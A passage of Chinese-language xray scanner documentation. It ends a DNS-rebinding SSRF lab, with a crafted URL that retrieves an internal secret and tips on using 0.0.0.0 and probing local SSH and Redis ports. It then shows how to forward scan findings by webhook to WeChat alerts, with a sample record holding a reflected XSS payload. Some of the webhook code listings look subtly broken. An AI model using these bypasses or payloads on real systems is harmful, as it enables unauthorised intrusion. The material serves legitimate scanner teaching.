        p-04f887-2kua.revc.xyz.	0	IN	A	127.0.0.1

        ;; Query time: 49 msec
        ;; SERVER: 140.143.224.171#53(140.143.224.171)
        ;; WHEN: Sun Sep 08 10:29:29 CST 2019
        ;; MSG SIZE  rcvd: 78
        ```

        可以看出来第一次和第二次的解析结果是不一样的，将 DNS 服务器更换为 `8.8.8.8` 可以得到相同的结果。

        因为 dns rebinding 配置的两次访问是有顺序的，而且我们已经都访问过了，如果再次去解析这个域名，反连平台就只能返回默认的解析结果了，这时候可以通过再次点击保存按钮来重置访问顺序。

        构造 `http://vuln.net:8000/?url=http://p-04f887-2kua.revc.xyz:8000/api/internal/secret` 的 url，我们又获取到了 secret。

        ![](/images/tools/xray/reverse_server_ssrf/15679099800999.jpg)


        ![](/images/tools/xray/reverse_server_ssrf/15679099947838.jpg)

        在 DNS 解析历史记录中，我们看到了两个 Google 的 IP，也就是说明 Python 的后端去解析了两次，因为 TTL=0，dns 服务器每次都要回源重新解析，这样第一次和第二次访问结果不一致也就绕过了检查。
    </Accordion>
</AccordionGroup>

### 备注（note）

- 使用 `0.0.0.0` 代替 `127.0.0.1` 是另外一种绕过思路
- 利用上面的思路访问本地的 22 和 6379 还可以发现 SSH 和 Redis 服务，也是一个重要的信息。

## 对接 xray 和微信实现自动告警（webhook）

<Warning>本文的代码写法随着 xray 和第三方服务的升级改进会逐渐失效，请仅参考思路。在 xray Github 仓库 [webhook](https://github.com/chaitin/xray/blob/master/webhook/) 目录中有最新的实现代码</Warning>

### 如何第一时间知道扫出了漏洞（find vuln）

对于安全工程师来说，扫描器发现了漏洞能第一时间给出告警是非常重要的，因为安全工程师使用的是 xray 的基础爬虫模式，爬虫一直在爬也不会一直人工刷新和查看漏洞报告，也有可能是使用的被动代理模式，让测试人员挂扫描器代理然后访问各个业务页面，但是不知道什么时间测试人员才开始和完成测试，也有可能是日志扫描模式，导入日志使用脚本进行 url 扫描，不知道什么时间才能重放完成。

还有很多公司自建了漏洞管理系统、工单系统等等，如果扫描器发现了漏洞可以自动同步这些系统也将会大大解放安全人员。针对这些场景 xray 有一种漏洞输出模式叫 `webhook-output`，在发现漏洞的时候，将会向指定的 url post 漏洞数据，demo 的代码就是

```python
import requests
requests.post(webhook, json=vuln_info)
```

如果我们写一个中间的转换和转发层，就可以很方便的实现下面的功能了

- 发送邮件、短信告警
- 发送微信、企业微信、钉钉、slack告警
- 漏洞信息同步到自己的数据库中
- 为该漏洞创建一个工单
- 使用其他的工具去验证漏洞是否存在
- ......

### 使用 webhook 做自动推送
本文就借助 [Server酱](http://sc.ftqq.com/3.version) 和[企业微信机器人](https://work.weixin.qq.com/help?person_id=1&doc_id=13376)，来演示如何实时通知 xray 发现了漏洞。

### xray 的 webhook 是什么
对于 xray，webhook 应该是一个 url 地址，也就是我们需要自己搭建一个 web 服务器，接收到 xray 发送的漏洞信息，然后在将它转发，借助于 Python 的 flask 框架，我们很快写了一个 webhook url 的 demo 出来。

```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def xray_webhook():
    print(request.json)
    return 'ok'

if __name__ == '__main__':
    app.run()
```

使用 `xray webscan --url http://pentester-web.vulnet/sqli/example1.php?name=root --plugins sqldet --webhook-output http://127.0.0.1:5000/webhook` 测试，然后发现成功打印出了漏洞信息。

```shell
 * Serving Flask app "app.py"
 * Environment: development
 * Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
{'data': {'create_time': 1642737377634, 'detail': {'addr': 'http://demo.aisec.cn/demo/aisec/js_link.php?id=2&msg=abc', 'extra': {'param': {'key': 'msg', 'position': 'query', 'value': 'aeltmuuikqaqokdvpawp'}}, 'payload': "'><ScRiPt>alert(1)</sCrIpT>", 'snapshot': [['GET /demo/aisec/js_link.php?id=2&msg=%27%3E%3CScRiPt%3Efddsnqpcqy%3C%2FScRiPt%3E HTTP/1.1\r\nHost: demo.aisec.cn\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept-Encoding: gzip\r\n\r\n', "HTTP/1.1 200 OK\r\nCache-Control: no-cache, must-revalidate\r\nConnection: keep-alive\r\nContent-Type: text/html\r\nDate: Fri, 21 Jan 2022 03:56:17 GMT\r\nServer: WAF3.0\r\nX-Powered-By: PHP/5.4.16\r\n\r\nArray\n(\n    [id] => 2\n    [num] => 22\n)\n<br><br> has this record. \r\n\r\n<br><br><br>\r\n\r\n\r\n\r\n\r\n\r\n<a href='?'><ScRiPt>fddsnqpcqy</ScRiPt>'>link  msg:'><ScRiPt>fddsnqpcqy</ScRiPt></a> (This link has XSS,eg:?msg=' style=x:expression() onmouseover=alert(1) ')\r\n\r\n\r\n<br><br><br>\r\n<hr>\r\n\r\n\r\n<a href='index.php'>go back</a>\r\n\r\n<br><br><br>\r\n"]]}, 'plugin': 'xss/reflected/default', 'target': {'params': [{'path': ['msg'], 'position': 'query'}], 'url': 'http://demo.aisec.cn/demo/aisec/js_link.php'}}, 'type': 'web_vuln'}
127.0.0.1 - - [27/Aug/2019 00:17:36] "POST /webhook HTTP/1.1" 200 -
```

接下来就是解析 xray 的漏洞信息，然后生成对应的页面模板就好了。需要参考[文档](/webhook/vuln)。因为推送不适合发送太大的数据量，所以就选择了基础的一些字段。

```python
from flask import Flask, request
import requests

app = Flask(__name__)


@app.route('/webhook', methods=['POST'])
def xray_webhook():
    data = request.json
    data_type = data['type']
    vuln = data["data"]
    # 因为还会收到 https://chaitin.github.io/xray/#/webhook/statistic 的数据
    if data_type == "web_vuln":
        return "ok"
    content = """## xray 发现了新漏洞

url: {url}

插件: {plugin}

发现时间: {create_time}

请及时查看和处理
""".format(url=vuln["target"]["url"], plugin=vuln["plugin"],
           create_time=str(datetime.datetime.fromtimestamp(vuln["create_time"] / 1000)))
    print(content)
    return 'ok'

if __name__ == '__main__':
    app.run()
```

<AccordionGroup>
    <Accordion title="Server 酱">
        Server酱是一款程序员和服务器之间的通信软件，也就是从服务器推报警和日志到手机的工具。

        开通并使用上它还是很简单的

        - 登入：用 GitHub 账号登录 [http://sc.ftqq.com/3.version](http://sc.ftqq.com/3.version)，就能获得一个 SECKEY
        - 绑定：扫码关注完成绑定
        - 发消息：往 `http://sc.ftqq.com/{SECKEY}.send` 发请求，就可以在微信里收到消息啦

        我们先用 Python 写一个简单的 demo，以下所有的 SECKEY 的实际值我都使用 `{SECKEY}` 代替，大家需要修改为自己的值。

        ```python
        import requests
        requests.post("https://sctapi.ftqq.com/{SECKEY}.send",
        data={"text": "xray vuln alarm", "desp": "test content"})
        ```

        很简单就收到了消息，将上面 xray 的漏洞信息结合在一起，就是

        ```python
        from flask import Flask, request
        import requests
        import datetime
        import logging

        app = Flask(__name__)


        def push_ftqq(content):
        resp = requests.post("https://sctapi.ftqq.com/{SECKEY}.send",
        data={"text": "xray vuln alarm", "desp": content})
        if resp.json()["data"]["errno"] != 0:
        raise ValueError("push ftqq failed, %s" % resp.text)

        @app.route('/webhook', methods=['POST'])
        def xray_webhook():
        data = request.json
        typed = data["type"]
        if typed == "web_statistic":
        return 'ok'
        vuln = data["data"]
        content = """## xray find new vuln

        url: {url}

        plugin: {plugin}

        create_time: {create_time}

        """.format(url=vuln["detail"]["addr"], plugin=vuln["plugin"],
        create_time=str(datetime.datetime.fromtimestamp(vuln["create_time"] / 1000)))
        try:
        push_ftqq(content)
        except Exception as e:
        logging.exception(e)
        return 'ok'


        if __name__ == '__main__':
        app.run()
        ```

        展示效果如图

        ![](/images/tools/xray/xray_vuln_alert/1.jpg)
    </Accordion>
    <Accordion title="企业微信群机器人">
        企业微信群机器人就像一个普通成员一样，可以发言，可以 `@` 人，如果我们接入企业微信群做 xray 的漏洞告警，也会大大方便漏洞的第一时间发现。

        开通和使用方法

        - 点击群聊右上角，然后找到 '群机器人'，然后点击'添加'
        - 复制 Webhook 的地址，保存备用

        ![](/images/tools/xray/xray_vuln_alert/2.jpg)


        调用的代码也非常简单，我们只需要展示主要的部分就可以了

        ```python
        def push_wechat_group(content):
        resp = requests.post("https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key={KEY}",
        json={"msgtype": "markdown",
        "markdown": {"content": content}})
        if resp.json()["errno"] != 0:
        raise ValueError("push wechat group failed, %s" % resp.text)
        ```

        展示效果如图

        ![](/images/tools/xray/xray_vuln_alert/3.jpg)
    </Accordion>
</AccordionGroup>

